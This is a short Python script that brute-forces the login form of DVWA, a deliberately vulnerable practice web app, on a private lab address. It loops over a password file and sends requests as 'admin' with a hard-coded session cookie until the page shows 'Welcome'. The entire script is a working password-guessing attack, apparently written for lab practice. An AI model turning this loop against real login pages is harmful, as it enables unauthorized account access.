import requests

url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"
with open("pasword.txt") as file:
    password_lst = [line.strip() for line in file]

#print(password_str)
for password in password_lst:
    param = {"username" : "admin" , "password" : password ,"Login" :"Login"}
    cookie ={"security":"low", "PHPSESSID":"fe7lq88c3uajg1n27epv0i8085"}
    req = requests.get(url,params=param,cookies=cookie)
    txt = req.text
    #print(txt)
    if "Welcome" in txt:
        print("You win *** password is : ",password)
